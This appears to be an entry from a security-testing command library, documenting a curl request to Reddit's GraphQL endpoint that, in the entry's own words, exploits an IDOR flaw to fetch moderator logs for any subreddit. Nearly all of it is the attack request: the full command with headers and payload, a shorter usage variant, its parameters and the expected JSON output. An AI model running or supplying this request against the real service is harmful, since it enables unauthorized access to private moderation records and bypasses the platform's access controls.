---
data: >-
  curl -X POST https://gql.reddit.com/ -H "User-Agent: Mozilla/5.0 (X11; Linux
  x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" -H "Accept: */*" -H
  "Content-Type: application/json" -H "Authorization: Bearer your_token" -H
  "Origin: https://www.reddit.com" -H "Referer: https://www.reddit.com/" -d
  '{"id":"6243efcbc61d","variables":{"subredditName":"target-subreddit"}}'
tags:
  - graphql
  - idor
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:48.056Z'
id: 997a4a73-e2bf-4d26-8d61-c7b8b7f795be
verified: false
validated: true
submitted: true
---
# reddit-graphql-modlogs-initial

## Command

```bash
curl -X POST https://gql.reddit.com/ \
  -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" \
  -H "Accept: */*" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer your_token" \
  -H "Origin: https://www.reddit.com" \
  -H "Referer: https://www.reddit.com/" \
  -d '{"id":"6243efcbc61d","variables":{"subredditName":"target-subreddit"}}'
```

## Description

Executes the initial GraphQL query to fetch moderator logs, exploiting IDOR by specifying any subreddit.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| Bearer your_token | Reddit authentication token | Yes |
| subredditName | Target subreddit (e.g., 'target-subreddit') | Yes |
| id | Fixed operation ID '6243efcbc61d' | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://gql.reddit.com/ -H "Authorization: Bearer abc123" -H "Content-Type: application/json" -d '{"id":"6243efcbc61d","variables":{"subredditName":"example"}}'
```

### Advanced Usage

Add verbose output: curl -v ...

## Expected Output

JSON with modActions array, pageInfo including hasNextPage and endCursor.

## Related

- [[commands/reddit-graphql-modlogs-paginated]]
- [[procedures/Fetch-Initial-Moderator-Logs-via-GraphQL]]
